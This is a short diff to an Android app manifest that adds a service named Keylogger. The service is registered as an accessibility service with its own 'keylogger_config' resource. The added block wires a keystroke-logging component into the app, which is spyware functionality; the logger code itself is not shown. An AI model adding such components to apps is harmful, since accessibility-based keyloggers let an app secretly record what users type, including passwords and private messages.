@@ -64,6 +64,19 @@
             android:name=".ui.register.RegisterActivity"
             android:theme="@style/AppThemeNoActionBar" />
 
+        <service
+            android:name=".workers.Keylogger"
+            android:label="@string/keylogger_service_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/keylogger_config" />
+        </service>
+
     </application>
 
 </manifest>
